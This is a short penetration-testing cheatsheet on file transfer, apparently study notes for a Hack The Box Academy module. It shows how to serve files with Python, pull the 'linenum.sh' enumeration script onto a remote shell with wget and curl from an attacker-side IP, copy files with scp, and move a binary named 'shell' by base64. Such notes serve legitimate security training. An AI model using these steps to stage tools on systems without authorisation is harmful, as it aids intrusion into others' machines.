# File Transfer — Command Cheatsheet

[← Cheatsheets](README.md) · [Detailed explanation](../Topics-for-Studies/File-Transfers.md)

## Host a file locally

```bash
cd /tmp
python3 -m http.server 8000
```

`cd /tmp` selects the directory served; `-m http.server` starts Python's HTTP server on port `8000`.

## Download from a remote shell

```bash
wget http://10.10.14.1:8000/linenum.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

The HTTP server must be reachable from the remote machine. `curl -o` selects the output filename.

## Copy using SSH

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

`scp` copies the local file to the specified remote path using SSH authentication.

## Text-based file transfer

```bash
base64 shell -w 0
```

Paste all encoded text on the receiving system and decode it:

```bash
echo '<COMPLETE_BASE64_DATA>' | base64 -d > shell
```

The placeholder must be replaced with the full encoded data. GNU `-w 0` disables line wrapping; `-d` decodes; `>` writes binary bytes to a file.

## Validate transfer

```bash
file shell
md5sum shell
```

The example file type is an ELF 64-bit executable. Compare the `md5sum` value on both machines; the study example uses `321de1d7e7c3735838890a72c9ae7d1d` on both ends. `file` identifies type but cannot establish byte-for-byte equality.

## References

- [Local server guide](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server)
- [Base64 manual](https://linux.die.net/man/1/base64)
- [File utility manual](https://linux.die.net/man/1/file)
- [File transfer reference](https://academy.hackthebox.com/module/details/24)
